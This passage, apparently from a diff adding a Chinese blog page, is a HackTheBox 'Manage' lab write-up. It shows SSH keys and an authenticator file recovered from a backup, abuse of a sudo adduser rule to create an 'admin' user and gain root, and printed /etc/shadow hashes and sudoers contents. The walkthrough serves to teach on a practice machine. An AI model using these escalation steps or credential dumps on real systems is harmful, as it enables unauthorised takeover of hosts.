Jun 21  2024 backups</span><br><span class="line">lrwxrwxrwx 1 useradmin useradmin    9 Jun 21  2024 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 useradmin useradmin  220 Jun 21  2024 .bash_logout</span><br><span class="line">-rw-r--r-- 1 useradmin useradmin 3771 Jun 21  2024 .bashrc</span><br><span class="line">drwx------ 2 useradmin useradmin 4096 Jun 21  2024 .cache</span><br><span class="line">-r-------- 1 useradmin useradmin  200 Jun 21  2024 .google_authenticator</span><br><span class="line">-rw-r--r-- 1 useradmin useradmin  807 Jun 21  2024 .profile</span><br><span class="line">drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .ssh</span><br></pre></td></tr></table></figure>
+
+<p>在<code>useradmin</code>文件夹下面有一个<code>backups</code>的目录，而且还可读</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tomcat@manage:/home/useradmin$ <span class="built_in">cd</span> backups</span><br><span class="line"><span class="built_in">cd</span> backups</span><br><span class="line">tomcat@manage:/home/useradmin/backups$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .</span><br><span class="line">drwxr-xr-x 5 useradmin useradmin 4096 Jun 26 09:58 ..</span><br><span class="line">-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21  2024 backup.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>先传过来看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╰─ ❯❯ tar xvf backup.tar.gz </span><br><span class="line">./</span><br><span class="line">./.bash_logout</span><br><span class="line">./.profile</span><br><span class="line">./.ssh/</span><br><span class="line">./.ssh/id_ed25519</span><br><span class="line">./.ssh/authorized_keys</span><br><span class="line">./.ssh/id_ed25519.pub</span><br><span class="line">./.bashrc</span><br><span class="line">./.google_authenticator</span><br><span class="line">./.cache/</span><br><span class="line">./.cache/motd.legal-displayed</span><br><span class="line">./.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>有id_rsa，试试行不行</p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-5.png" data-caption=""><img src="/images/Manage-5.png"></a></p>
+<p>这，仔细看上面的目录还有个<code>.google_authenticator</code>，进去看看有没有头绪</p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-6.png" data-caption=""><img src="/images/Manage-6.png"></a></p>
+<p>运气真好，第一个就进去了</p>
+<h2 id="Shell-As-Useradmin"><a href="#Shell-As-Useradmin" class="headerlink" title="Shell As Useradmin"></a>Shell As Useradmin</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradmin@manage:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> useradmin on manage:</span><br><span class="line">    env_reset, timestamp_timeout=1440, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User useradmin may run the following commands on manage:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span><br></pre></td></tr></table></figure>
+
+<p>试试加一个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">useradmin@manage:~$ <span class="built_in">sudo</span> adduser wansh</span><br><span class="line">Adding user `wansh<span class="string">&#x27; ...</span></span><br><span class="line"><span class="string">Adding new group `wansh&#x27;</span> (1004) ...</span><br><span class="line">Adding new user `wansh<span class="string">&#x27; (1004) with group `wansh&#x27;</span> ...</span><br><span class="line">Creating home directory `/home/wansh<span class="string">&#x27; ...</span></span><br><span class="line"><span class="string">Copying files from `/etc/skel&#x27;</span> ...</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br><span class="line">Changing the user information <span class="keyword">for</span> wansh</span><br><span class="line">Enter the new value, or press ENTER <span class="keyword">for</span> the default</span><br><span class="line">        Full Name []: </span><br><span class="line">        Room Number []: </span><br><span class="line">        Work Phone []: </span><br><span class="line">        Home Phone []: </span><br><span class="line">        Other []: </span><br><span class="line">Is the information correct? [Y/n] </span><br></pre></td></tr></table></figure>
+
+<p>豁，可以直接加的</p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-7.png" data-caption=""><img src="/images/Manage-7.png"></a></p>
+<p>还能切换过去的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wansh@manage:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> wansh: </span><br><span class="line">Sorry, user wansh may not run <span class="built_in">sudo</span> on manage.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ubuntu-Default-Sudoers-Admin-Group-Add"><a href="#Ubuntu-Default-Sudoers-Admin-Group-Add" class="headerlink" title="Ubuntu Default Sudoers Admin Group Add"></a>Ubuntu Default Sudoers Admin Group Add</h3><p>不行啊，google一下<br>哦，吧唧是ubuntu<br><code>/etc/sudoers</code>不让读<br>他加用户的时候还会加一个同名的组，看<code>/etc/passwd</code>没看出什么用户来，看一下组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">useradmin@manage:~$ <span class="built_in">cat</span> /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,karl</span><br><span class="line"><span class="built_in">tty</span>:x:5:</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:</span><br><span class="line">mail:x:8:</span><br><span class="line">news:x:9:</span><br><span class="line">uucp:x:10:</span><br><span class="line">man:x:12:</span><br><span class="line">proxy:x:13:</span><br><span class="line">kmem:x:15:</span><br><span class="line">dialout:x:20:</span><br><span class="line">fax:x:21:</span><br><span class="line">voice:x:22:</span><br><span class="line">cdrom:x:24:karl</span><br><span class="line">floppy:x:25:</span><br><span class="line">tape:x:26:</span><br><span class="line"><span class="built_in">sudo</span>:x:27:karl</span><br><span class="line">audio:x:29:</span><br><span class="line">dip:x:30:karl</span><br><span class="line">www-data:x:33:</span><br><span class="line">backup:x:34:</span><br><span class="line">operator:x:37:</span><br><span class="line">list:x:38:</span><br><span class="line">irc:x:39:</span><br><span class="line">src:x:40:</span><br><span class="line">gnats:x:41:</span><br><span class="line">shadow:x:42:</span><br><span class="line">utmp:x:43:</span><br><span class="line">video:x:44:</span><br><span class="line">sasl:x:45:</span><br><span class="line">plugdev:x:46:karl</span><br><span class="line">staff:x:50:</span><br><span class="line">games:x:60:</span><br><span class="line"><span class="built_in">users</span>:x:100:</span><br><span class="line">nogroup:x:65534:</span><br><span class="line">systemd-journal:x:101:</span><br><span class="line">systemd-network:x:102:</span><br><span class="line">systemd-resolve:x:103:</span><br><span class="line">messagebus:x:104:</span><br><span class="line">systemd-timesync:x:105:</span><br><span class="line">input:x:106:</span><br><span class="line">sgx:x:107:</span><br><span class="line">kvm:x:108:</span><br><span class="line">render:x:109:</span><br><span class="line">lxd:x:110:karl</span><br><span class="line">_ssh:x:111:</span><br><span class="line">crontab:x:112:</span><br><span class="line">syslog:x:113:</span><br><span class="line">uuidd:x:114:</span><br><span class="line">tcpdump:x:115:</span><br><span class="line">tss:x:116:</span><br><span class="line">landscape:x:117:</span><br><span class="line">fwupd-refresh:x:118:</span><br><span class="line">karl:x:1000:</span><br><span class="line">tomcat:x:1001:</span><br><span class="line">useradmin:x:1002:</span><br><span class="line">netdev:x:119:</span><br><span class="line">_laurel:x:998:</span><br></pre></td></tr></table></figure>
+
+<p>也没啥<br>googless搜索到<a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/Sudoers">The Default Ubuntu Sudoers File</a></p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-8.png" data-caption=""><img src="/images/Manage-8.png"></a></p>
+<p>可以有一个admin组，但是在group里面没看到，试一下可不可以新增admin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">useradmin@manage:~$ <span class="built_in">sudo</span> adduser admin                       </span><br><span class="line">Adding user `admin<span class="string">&#x27; ...                                                                                                   </span></span><br><span class="line"><span class="string">Adding new group `admin&#x27;</span> (1003) ...                          </span><br><span class="line">Adding new user `admin<span class="string">&#x27; (1003) with group `admin&#x27;</span> ...</span><br><span class="line">Creating home directory `/home/admin<span class="string">&#x27; ...</span></span><br><span class="line"><span class="string">Copying files from `/etc/skel&#x27;</span> ...</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">No password has been supplied. </span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br><span class="line">Changing the user information <span class="keyword">for</span> admin</span><br><span class="line">Enter the new value, or press ENTER <span class="keyword">for</span> the default</span><br><span class="line">        Full Name []: </span><br><span class="line">        Room Number []: </span><br><span class="line">        Work Phone []: </span><br><span class="line">        Home Phone []: </span><br><span class="line">        Other []: </span><br><span class="line">Is the information correct? [Y/n] </span><br><span class="line">useradmin@manage:~$ su - admin</span><br><span class="line">Password: </span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">admin@manage:~$ </span><br></pre></td></tr></table></figure>
+
+<p>还真可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin@manage:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> admin: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> admin on manage:</span><br><span class="line">    env_reset, timestamp_timeout=1440, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User admin may run the following commands on manage:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line">admin@manage:~$ <span class="built_in">sudo</span> su</span><br><span class="line">root@manage:/home/admin# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">b3645b7e6db6d5276ad33f0c75b8dc34</span><br></pre></td></tr></table></figure>
+
+<p>got root</p>
+<h2 id="Shell-As-Root"><a href="#Shell-As-Root" class="headerlink" title="Shell As Root"></a>Shell As Root</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@manage:/home/admin# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$y$j9T$2Gzp9jdcIuSaORXbywn4q1<span class="variable">$rx</span>/.gBymIPOwspzEKsoOy7bySKR/i815IvFg0JVc/.9:19783:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19783:0:99999:7:::</span><br><span class="line">karl:$6<span class="variable">$oT</span>.oJAmvjQXE17Rr<span class="variable">$tRHDOhX4nwHGlUeCnAqiqgtuOiXu</span>/sNxkwSoVa36NNP.sNOFCSm.sURhglisZXD638J6cM.Km2R0emZWw8OA50:19783:0:99999:7:::</span><br><span class="line">lxd:!:19783::::::</span><br><span class="line">tomcat:$y$j9T<span class="variable">$zcEmP3Cjlp</span>.Gqi.3ED.Uy1<span class="variable">$vg</span>/1q.iztchYw8Xq/nsY8eSckZfaKBNA2gC67inqc41:19895:0:99999:7:::</span><br><span class="line">useradmin:$y$j9T<span class="variable">$lbsOgtw1Mtlq2TSVbzFIT</span>/<span class="variable">$PovOHBY3Ah4EViM1hPs4SanDo</span>.xPLHnlv3.UdNw3FwD:19895:0:99999:7:::</span><br><span class="line">_laurel:!:20265::::::</span><br><span class="line">admin:$y$j9T<span class="variable">$UJ15B0xo5pRgc0ZM2nL</span>...<span class="variable">$InjSMOINgVSb5Xit3bj</span>.LpjSOsDgxDGfej2b4dTeo87:20299:0:99999:7:::</span><br><span class="line">wansh:$y$j9T<span class="variable">$EJZbc7p9ZDBheM</span>.0IjzMn.<span class="variable">$h</span>.icHr5HNfkB3ZSweGZ9A7DQIbIXVaBSzfZ5wqRAI12:20299:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudoers"><a href="#Sudoers" class="headerlink" title="Sudoers"></a>Sudoers</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">root@manage:/home/admin# <span class="built_in">cat</span> /etc/sudoers                                                                                 </span><br><span class="line"><span class="comment">#                                                                                                                         </span></span><br><span class="line"><span class="comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.                                                             </span></span><br><span class="line"><span class="comment">#                                                                                                                         </span></span><br><span class="line"><span class="comment"># Please consider adding local content in /etc/sudoers.d/ instead of                                                      </span></span><br><span class="line"><span class="comment"># directly modifying this file.                                                                                           </span></span><br><span class="line"><span class="comment">#                                                            </span></span><br><span class="line"><span class="comment"># See the man page for details on how to write a sudoers file.                                                            </span></span><br><span class="line"><span class="comment">#                                                            </span></span><br><span class="line">Defaults        env_reset </span><br><span class="line">Defaults        timestamp_timeout=1440                       </span><br><span class="line">Defaults        mail_badpass                                                                                              </span><br><span class="line">Defaults        secure_path=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;</span></span><br><span class="line">Defaults        use_pty                                                                                                   </span><br><span class="line">                                                             </span><br><span class="line"><span class="comment"># This preserves proxy settings from user environments of root</span></span><br><span class="line"><span class="comment"># equivalent users (group sudo)                              </span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;http_proxy https_proxy ftp_proxy all_proxy no_proxy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This allows running arbitrary commands, but so does ALL, and it means</span></span><br><span class="line"><span class="comment"># different sudoers have their choice of editor respected.</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;EDITOR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Completely harmless preservation of a user preference.</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;GREP_COLOR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># While you shouldn&#x27;t normally run git as root, you need to with etckeeper</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;GIT_AUTHOR_* GIT_COMMITTER_*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Per-user preferences; root won&#x27;t have sensible values for them.</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;EMAIL DEBEMAIL DEBFULLNAME&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;sudo scp&quot; or &quot;sudo rsync&quot; should be able to use your SSH agent.</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;SSH_AGENT_PID SSH_AUTH_SOCK&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ditto for GPG agent</span></span><br><span class="line"><span class="comment">#Defaults:%sudo env_keep += &quot;GPG_AGENT_INFO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Host alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cmnd alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User privilege specification </span></span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Members of the admin group may gain root privileges</span></span><br><span class="line">%admin ALL=(ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow members of group sudo to execute any command</span></span><br><span class="line">%<span class="built_in">sudo</span>   ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="comment"># See sudoers(5) for more information on &quot;@include&quot; directives:</span></span><br><span class="line"></span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#useradmin ALL=(ALL:ALL) NOPASSWOD /usr/sbin/adduser *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># new version, pentest showed wildcard is bad</span></span><br><span class="line">useradmin ALL=(ALL:ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8080"><span class="toc-number">1.1.</span> <span class="toc-text">8080</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Rmi-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Java Rmi exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Tomcat"><span class="toc-number">2.</span> <span class="toc-text">Shell As Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backups-Documents-Got-Id-rsa-And-Google-auth-code"><span class="toc-number">2.1.</span> <span class="toc-text">Backups Documents Got Id_rsa And Google_auth code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Useradmin"><span class="toc-number">3.</span> <span class="toc-text">Shell As Useradmin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-Default-Sudoers-Admin-Group-Add"><span class="toc-number">3.1.</span> <span class="toc-text">Ubuntu Default Sudoers Admin Group Add</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudoers"><span class="toc-number">4.2.</span> <span class="toc-text">Sudoers</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/30/Manage/Manage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&text=HackTheBox——HTB Manage Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&is_video=false&description=HackTheBox——HTB Manage Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Manage Writeup&body=Check out this article: https://n0nome.github.io/2025/07/30/Manage/Manage/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&name=HackTheBox——HTB Manage Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/30/Manage/Manage/&t=HackTheBox——HTB Manage Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
